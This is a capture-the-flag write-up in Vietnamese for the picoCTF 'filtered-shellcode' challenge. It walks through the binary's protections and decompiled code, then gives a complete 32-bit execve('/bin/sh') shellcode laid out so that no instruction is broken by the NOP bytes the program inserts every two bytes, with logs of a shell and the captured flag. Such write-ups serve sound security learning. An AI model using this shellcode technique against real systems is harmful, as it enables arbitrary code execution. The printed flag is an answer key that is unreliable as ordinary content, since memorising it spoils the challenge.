# *Chall: filtered-shellcode*
*file bin: fun*
***

## Đầu tiên ta sẽ xem tra các chế độ bảo vệ của file bin:
```sh
pwndbg> checksec
File:     /mnt/d/Documents/ISP/PractiseTask1/ret2shellcode/fun
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
pwndbg>
```
- Chương trình chạy kiến trúc i386 32bit, ta sẽ viết shellcode 32 bit bằng asm
- No canary found cho phép ta bof chương trình
- NX unknown và Stack Executable giúp ta có thể thực thi được đoạn shellcode mà ta inject trên stack
- No PIE địa chỉ các hàm trong file bin cố định
**-> Ta sẽ viết shellcode 32 bit rồi inject trên stack**
## Tiếp theo ta sẽ dùng ida xem mã giả của chương trình:
- Chương trình gồm 2 hàm chính: main(),  execute()
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[1000]; // [esp+1h] [ebp-3F5h] BYREF
  _DWORD v5[3]; // [esp+3E9h] [ebp-Dh]

  *(_DWORD *)((char *)&v5[1] + 1) = &argc;
  setbuf(stdout, 0);
  LOBYTE(v5[1]) = 0;
  puts("Give me code to run:");
  v5[0] = (unsigned __int8)fgetc(stdin);
  while ( LOBYTE(v5[0]) != 10 && *(_DWORD *)((char *)v5 + 1) <= 0x3E7u )
  {
    v4[*(_DWORD *)((char *)v5 + 1)] = v5[0];
    LOBYTE(v5[0]) = fgetc(stdin);
    ++*(_DWORD *)((char *)v5 + 1);
  }
  if ( (v5[0] & 0x100) != 0 )
    v4[(*(_DWORD *)((char *)v5 + 1))++] = -112;
  execute(v4, *(_DWORD *)((char *)v5 + 1));
  return 0;
}
```
```c
int __cdecl execute(int a1, int a2)
{
  void *v2; // esp
  int v3; // eax
  _DWORD v5[3]; // [esp+0h] [ebp-28h] BYREF
  int (*v6)(void); // [esp+Ch] [ebp-1Ch]
  int v7; // [esp+10h] [ebp-18h]
  unsigned int v8; // [esp+14h] [ebp-14h]
  int v9; // [esp+18h] [ebp-10h]
  unsigned int i; // [esp+1Ch] [ebp-Ch]

  if ( !a1 || !a2 )
    exit(1);
  v8 = 2 * a2;
  v7 = 2 * a2;
  v2 = alloca(16 * ((2 * a2 + 16) / 0x10u));
  v6 = (int (*)(void))v5;
  v9 = 0;
  for ( i = 0; v8 > i; ++i )
  {
    if ( (int)i % 4 > 1 )
    {
      *((_BYTE *)v6 + i) = -112;
    }
    else
    {
      v3 = v9++;
      *((_BYTE *)v6 + i) = *(_BYTE *)(v3 + a1);
    }
  }
  *((_BYTE *)v6 + v8) = -61;
  v5[2] = v6;
  return v6();
}
```
**- Mô tả chương trình:**
Tại hàm main, ta sẽ coi v4 là buf mà ta nhập, còn v5 biến tạm khi hàm fgetc đọc từng kí tự trả về, đầu tiên sẽ dùng hàm fgetc để đọc từng kí tự từ stdin lưu vào v4, Dừng khi gặp '\n' hoặc đủ 999 kí tự. Rồi chương trình cho thực thi hàm execute() với tham số thứ nhất là chuỗi buf và tham số thứ 2 là độ dài của buf. Độ dài được tăng dần ở dòng ++*(_DWORD *)((char *)v5 + 1);
Tại hàm execute()
v8 = v7 = len*2 : biến lưu gấp đôi độ dài buf
sau đó cấp phát vùng nhớ trên stack với kích thức 2*len.
Biến v6 đc khai báo để gán về vùng v5, và sau đó được sử dụng như 1 con trỏ trỏ tới hàm
Tới vào lặp với các chỉ số %4 > 1 thì sẽ copy byte từ input, còn lại sẽ điền byte 0x90 (NOP: No Operation ko thực thi gì chỉ tiến tới lệnh kế) xẽn kẽ vào dữ liệu nhập. Tức là ở các vị trí chẵn của shellcode vì mỗi lệnh có độ dài 2 byte.
cuối cùng thêm 0xC3 vào cuối (0xC3 chính là lệnh ret trong x86). Cuối cùng thực thi v6() thực thi code ở buffer vừa filter
**Tóm lại, chương trình cho phép người dùng nhập “machine code” để chạy trực tiếp, nhưng với điều kiện xen thêm NOP ở mỗi 2 byte.**

**- Phân tích chương trình:**
Vậy chương trình hướng đến việc ta thêm nhập vào input 1 shellcode hợp lệ nhưng phải vẫn chạy đc khi bị chèn thêm các NOP để thực thi execve("/bin/sh")
## Khai thác lỗ hổng:
### Với shellcode 32 bit thường:
- Ta có đoạn code asm sau:
```asm
;Tạo chuỗi '//bin/sh'
xor eax, eax    
push eax        
push '//sh'
push '/bin'

;Thiết lập các tham số
mov ebx, esp  
xor ecx, ecx
xor edx, edx

;Gọi execve()
mov al, 0x0b
int 0x80
```
### Phân tích:
  - Do cách thức chèn NOP vào shellcode có cơ chế ví dụ như sau:
```
shell code gốc:          \x31\xC0\x31\xDB\.... 
sau khi lọc qua hàm:     \x31\xC0\0x90\0x90\x31\xDB\0x90\0x90\....
```

    -> Các vị trí chẵn của shellcode bị chèn NOP
  - Như vậy, khi nhìn lại shellcode lấy shell gốc ở trên thì hầu hết các lệnh đều dài đúng 2 byte, nên nó sẽ thực hiện đúng 2 byte rồi chèn NOP sẽ ko ảnh hưởng. Nhưng chỉ trừ cách push chuỗi "/bin/sh" lên stack nó chiếm 10 byte. Như vậy NOP sẽ phá hết shellcode của ta

-> Vậy ý tưởng là: ta sẽ đẩy từng kí tự của chuỗi "/bin/sh" lên stack. Các câu lệnh đẩy mỗi kí tự lên chỉ mất số chẵn lần byte để thực hiện (2, 4, ...)

### Thiết lập shellocde
- Đầu tiên ta sẽ thiết lập 1 stack rỗng 8 byte null và thiết lập edi trỏ tới chuỗi trên stack
```
xor eax, eax
push eax
push eax
mov edi, esp
```
- Sau đó ta sẽ xây dựng string bằng cách đẩy từng kí tự. Mỗi kí tự sẽ được push như sau:
  - Gán kí tự vào thanh ghi al
  - ghi kí tự vào ô nhớ hiện tại bằng lệnh add
  - trỏ kí tự đó sang byte kế tiếp để bảo các lần push kí tự sau không bị chèn vào ô của kí tự trước
  - Chèn thêm 1 byte NOP để đảm bảo cả đoạn chiếm số chẵn lần byte
  - Làm tương tự với toàn bộ kí tự trong chuỗi "/bin/sh"
- Ta có code:
```
   mov al, 0x2f
   add [edi], al                                              
   inc edi                          
   nop                              

   mov al, 0x62                     
   add [edi], al
   inc edi
   nop

   mov al, 0x69                    
   add [edi], al
   inc edi
   nop

   mov al, 0x6e                     
   add [edi], al
   inc edi
   nop

   mov al, 0x2f                     
   add [edi], al
   inc edi
   nop

   mov al, 0x73                     
   add [edi], al
   inc edi
   nop

   mov al, 0x68                     
   add [edi], al
   inc edi
   nop
```
- Xong rồi đoạn cuối, ta thiết lập các tham số cho hàm execve như bình thường thôi vì các lệnh đã đảm bảo số chẵn lần byte
- **Như vậy ta có shellcode tổng thể:**
```
xor eax, eax
   push eax                         
   push eax               
   mov edi, esp 

   mov al, 0x2f                    
   add [edi], al                                              
   inc edi                          
   nop                              

   mov al, 0x62                     
   add [edi], al
   inc edi
   nop

   mov al, 0x69                    
   add [edi], al
   inc edi
   nop

   mov al, 0x6e                     
   add [edi], al
   inc edi
   nop

   mov al, 0x2f                     
   add [edi], al
   inc edi
   nop

   mov al, 0x73                     
   add [edi], al
   inc edi
   nop

   mov al, 0x68                     
   add [edi], al
   inc edi
   nop                      
                          
   mov ebx, esp
   xor ecx, ecx                      
   xor edx, edx 
   mov al, 0xb

   int 0x80
```
- Do trong hàm execve sẽ return đến con trỏ trỏ đến shellcode vừa filter và thực thi nó nên ta chỉ cần send nó thôi
```
p.sendafter(b"run:\n", shellcode)
```
- Cuối cùng ta sẽ gửi lên local để kiểm tra:
```sh
$ ./solve.py
[+] Starting local process '/mnt/d/Documents/ISP/PractiseTask1/ret2shellcode/fun': pid 558
[*] Switching to interactive mode
$
$ ls
core.257  core.272  core.425  core.490  fun  fun.i64  solve.py  writeup.md
$ whoami
d1nhdwc
$
```
-> Ngon, giờ connect to sever để lấy cờ:
```sh
$ ./solve.py r
[+] Opening connection to mercury.picoctf.net on port 16610: Done
[*] Switching to interactive mode
$
$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{th4t_w4s_fun_aa5df727802dc4a9}$
```

